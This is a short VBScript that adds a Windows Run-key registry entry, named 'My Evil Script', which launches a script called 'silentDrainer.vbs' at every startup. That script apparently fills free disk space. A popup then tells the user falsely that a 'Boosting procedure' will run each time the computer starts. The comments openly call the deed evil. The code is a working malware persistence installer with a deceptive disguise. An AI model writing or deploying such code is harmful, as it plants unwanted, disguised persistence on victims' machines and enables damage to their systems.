Set objShell = CreateObject("WScript.Shell")

' Replace "your_script.vbs" with the path and name of your VBScript file.
scriptPath = "C:\Users\kormo\OneDrive\Desktop\batch\free space drainer\silentDrainer.vbs"

' Get the startup key in the registry
startupKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

' Add a registry entry to run the script at startup
objShell.RegWrite startupKey & "\My Evil Script", Chr(34) & scriptPath & Chr(34), "REG_SZ"

' Display a message indicating the evil deed is done
objShell.Popup "Boosting procedure will start after every time the computer turns on"

' Your evil code goes here...